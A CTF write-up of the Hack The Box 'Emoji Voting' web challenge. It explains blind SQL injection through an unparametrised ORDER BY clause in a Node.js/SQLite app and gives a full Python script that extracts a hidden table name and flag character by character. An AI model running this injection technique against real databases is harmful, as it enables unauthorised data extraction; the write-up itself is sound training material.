---
slug: emoji-voting-cyberapocalypse-2021-ctf
title: Emoji Voting - Cyberapocalypse 2021 CTF
description: This is a writeup for the Emoji voting challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.
authors: kiroki
tags: [Cyber Security, CTF]
---

This is a writeup for the Emoji voting challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.

## Prompt

A place to vote your favourite and least favourite puny human emojis!

<!-- truncate -->

## Recon

For this challenge, we are given the source code. We notice, that the technologies of interest in the back-end are nodejs running an express server, and sqlite for a database. 

### What's vulnerable?

After some poking around, we find that the most useful file for us is  `database.js`. In it we find two functions for getting access to the database, and one in particular stands out.

```js
async getEmojis(order) {
        // TOOD: add parametrization
        return new Promise(async (resolve, reject) => {
            try {
                let query = `SELECT * FROM emojis ORDER BY ${ order }`;
                console.log(query)
                resolve(await this.db.all(query));
            } catch(e) {
                console.log(e)
                reject(e);
            }
        });
    }
```

As the comment in the code suggests, there's no parametrisation in building the query, and so it might be subject to some form of injection.

### Where's the flag?

After looking around a bit more, we find that the database consists of two tables - one for storing the emojis, but also one which holds the flag. The one with the flag has a name, which starts with `flag_`, but the second part of the name is 5 random bytes in hex (so 10 characters).

```js
async migrate() {
  let rand = crypto.randomBytes(5).toString('hex');

  return this.db.exec(`
    DROP TABLE IF EXISTS emojis;
    DROP TABLE IF EXISTS flag_${ rand };

    CREATE TABLE IF NOT EXISTS flag_${ rand } (
    flag TEXT NOT NULL
    );

    INSERT INTO flag_${ rand } (flag) VALUES ('CHTB{f4k3_fl4g_f0r_t3st1ng}');

    CREATE TABLE IF NOT EXISTS emojis (
    id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
    emoji   VARCHAR(255),
    name    VARCHAR(255),
    count   INTEGERT
    );

    INSERT INTO emojis (emoji, name, count) VALUES 
    ('👽', 'alien', 13),
    ('🛸', 'flying saucer', 3),
    ('👾', 'alien monster', 0),
    ('💩', '👇 = human', 118),
    ('🚽', '👇 = human', 19),
    ('🪠', '👇 = human', 2),
    ('🍆', 'eggplant', 69),
    ('🍑', 'peach', 40),
    ('🍌', 'banana', 21),
    ('🐶', 'dog', 80),
    ('🐷', 'pig', 37),
    ('👨', 'homo idiotus', 124)
  `);
}
```

## Analysis

### Attack vector

We might have our place of attack, but we have a problem. It seems that we're only allowed to inject into the `ORDER BY` clause of the select statement.

```js
let query = `SELECT * FROM emojis ORDER BY ${ order }`;
```

And this is not that easy. SQL doesn't accept UNION, WHERE, OR or AND clauses in the ORDER BY clause, so we need to use a nested query inside of it.

Not only that, but the only result that we can expect back is a change in the ordering of our emojis.

### What we need to find

We need the flag of course. But the flag is stored as an entry inside of a table we don't know the name of.

And since we can only inject into an ORDER BY clause, we can't get the name of the table (or the value of the flag for that matter) directly, but have to guess it letter by letter.

Let's build an example. Say we want to check if the 5th symbol of the table name is indeed `_` as in `flag_`. That would be `5F` in hex. We can do this like so

```sql
SELECT * FROM emojis
ORDER BY
	(CASE
    	(SELECT HEX(SUBSTR(tbl_name, 5, 1)) from 
        	(SELECT tbl_name FROM sqlite_master
            	WHERE type='table' and tbl_name like 'flag%'))
     WHEN '5F' THEN name ELSE count END) DESC
```

> Note: sqlite can't turn symbols into ASCII codes, so we have to use HEX instead. Also, HEX only matches hexes with no prefix (like `0x`), and only with capital letters (like `D4`).

The statement above will return the emojis in descending order by `name` if the fifth symbol is `_`, or ordered by `count` if the 5th symbol isn't an underscore.

## Solution

With our example in mind, let's build a script which will get the table name with the flag in it. We need to

1. Build a dictionary of printable symbols in hex
2. For each position in the name of the table, iterate through our dicitonary of symbols
3. If the order of the emojis corresponds to a True statement, record that symbol as part of the table name
4. Rinse and repeat until we reach the length of the table name (which we know is `flag_ + 10 ASCII symbols (5bytes in hex)`.

```python
#!/usr/bin/env python3

import requests
import string

url = 'http://138.68.179.198:32342/api/list'

listOfPrintable = list(string.printable)
listOfHexies = []
for char in listOfPrintable:
  listOfHexies.append(format(ord(char), 'x').upper())
dictie = dict(zip(listOfHexies, listOfPrintable))

def findTableName():
  tableNameLen = 15
  tableName = 'flag_'
  lookForCharOfIndex = 6

  while lookForCharOfIndex <= tableNameLen:

    for hexie in listOfHexies:
      data = {"order":f"(CASE (SELECT HEX(SUBSTR(tbl_name, {lookForCharOfIndex}, 1)) from (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name like 'flag%') ) WHEN '{hexie}' THEN name ELSE count END) DESC--"}

      r = requests.post(url, data=data)

      check = '"id":4' in r.text[0:10]
      if check == True:
        tableName += dictie[hexie]
        lookForCharOfIndex += 1
        print (tableName)

  return tableName

tableName = findTableName()
```

This will spit out the name of the flag table for us, which in this case was

```sh
flag_5ba432deb9
```

Next, we repeat the same process for the flag inside of that table, but we slightly modify our statement, to look for characters inside the flag entry, instead of the table name. This one actually ends up being easier to set up.

```js
data = {
    "order":f"""(CASE 
    (SELECT HEX(SUBSTR(flag, {lookForCharOfIndex}, 1)) from
    {foundTbaleName} ) WHEN '{hexie}' THEN name ELSE count END) DESC--"""
}
```

And so, we can build and add our `getFlag` function into our script. The whole thing looks like so:

```python
#!/usr/bin/env python3

import requests
import string

url = 'http://138.68.179.198:32342/api/list'

listOfPrintable = list(string.printable)
listOfHexies = []
for char in listOfPrintable:
  listOfHexies.append(format(ord(char), 'x').upper())
dictie = dict(zip(listOfHexies, listOfPrintable))

def findTableName():
  tableNameLen = 15
  tableName = 'flag_'
  lookForCharOfIndex = 6

  while lookForCharOfIndex <= tableNameLen:

    for hexie in listOfHexies:
      data = {"order":f"(CASE (SELECT HEX(SUBSTR(tbl_name, {lookForCharOfIndex}, 1)) from (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name like 'flag%') ) WHEN '{hexie}' THEN name ELSE count END) DESC--"}

      r = requests.post(url, data=data)

      check = '"id":4' in r.text[0:10]
      if check == True:
        tableName += dictie[hexie]
        lookForCharOfIndex += 1
        print (tableName)

  return tableName

def getFlag(foundTbaleName):
  flag = 'CHTB{'
  lookForCharOfIndex = 6

  while True:
    foundLast = '{'
    for hexie in listOfHexies:
      data = {"order":f"(CASE (SELECT HEX(SUBSTR(flag, {lookForCharOfIndex}, 1)) from {foundTbaleName} ) WHEN '{hexie}' THEN name ELSE count END) DESC--"} # look for FLAG!

      r = requests.post(url, data=data)
      check = '"id":4' in r.text[0:10]
      if check == True:
        foundLast = dictie[hexie]
        flag += dictie[hexie]
        lookForCharOfIndex += 1
        print (flag)
    if foundLast == '}':
      break

tableName = findTableName()
getFlag(tableName)
```

Which will spit out our flag

```sh
CHTB{order_me_this_juicy_info}
```